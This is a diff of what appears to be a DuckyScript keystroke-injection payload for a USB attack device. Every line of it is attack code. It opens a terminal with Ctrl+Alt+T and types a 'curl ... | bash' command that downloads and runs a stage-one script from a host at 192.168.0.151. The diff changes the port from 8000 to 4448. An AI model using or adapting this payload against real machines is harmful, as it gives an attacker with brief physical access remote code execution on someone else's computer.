@@ -1,3 +1,5 @@
 DELAY 1000
-STRING bash -c 'curl http://192.168.0.151:8000/final_stage1.sh | bash'
+CTRL ALT t
+DELAY 500
+STRING bash -c 'curl http://192.168.0.151:4448/final_stage1.sh | bash'
 ENTER
